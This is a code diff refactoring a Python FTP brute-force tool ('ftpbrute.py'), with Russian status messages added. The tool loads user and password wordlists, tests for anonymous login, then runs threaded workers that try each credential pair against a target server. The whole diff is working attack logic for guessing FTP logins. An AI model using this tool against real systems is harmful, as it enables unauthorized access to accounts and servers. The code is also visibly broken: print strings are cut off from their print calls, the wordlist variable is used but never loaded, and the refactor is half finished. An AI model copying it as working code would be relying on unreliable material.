@@ -12,38 +12,26 @@ from ftplib import FTP
 from copy import copy
 
 
-if len(sys.argv) != 4:
+
+# "Usage: ./ftpbrute.py <server> <userlist> <wordlist>"
+#    sys.exit(1)
+
+def Start(server, userlist, wordlist):
+    try:
+        users = open(userlist, "r").readlines()
+    except(IOError):
+        print('Error: Check your userlist path')
+    print('FTP брутфорс запущен со следующими параметрами:')
+    print('Параметры:')
+    "[+] Server:", server
     print
-    "Usage: ./ftpbrute.py <server> <userlist> <wordlist>"
-    sys.exit(1)
+    "[+] Users Loaded:", len(users)
+    print
+    "[+] Words Loaded:", len(words), "\n"
+
 
 try:
-    users = open(sys.argv[2], "r").readlines()
-except(IOError):
-    print
-    "Error: Check your userlist path\n"
-    sys.exit(1)
-
-try:
-    words = open(sys.argv[3], "r").readlines()
-except(IOError):
-    print
-    "Error: Check your wordlist path\n"
-    sys.exit(1)
-
-print
-"\n\t   d3hydr8[at]gmail[dot]com ftpBruteForcer v1.0"
-print
-"\t--------------------------------------------------\n"
-print
-"[+] Server:", sys.argv[1]
-print
-"[+] Users Loaded:", len(users)
-print
-"[+] Words Loaded:", len(words), "\n"
-
-try:
-    f = FTP(sys.argv[1])
+    f = FTP(server)
     print
     "[+] Response:", f.getwelcome()
 except (ftplib.all_errors):
@@ -52,7 +40,7 @@ except (ftplib.all_errors):
 try:
     print
     "\n[+] Checking for anonymous login\n"
-    ftp = FTP(sys.argv[1])
+    ftp = FTP(server)
     ftp.login()
     ftp.retrlines('LIST')
     print
@@ -98,7 +86,7 @@ class Worker(threading.Thread):
             "-" * 12
             print
             "User:", user, "Password:", value
-            ftp = FTP(sys.argv[1])
+            ftp = FTP(server)
             ftp.login(user, value)
             ftp.retrlines('LIST')
             print
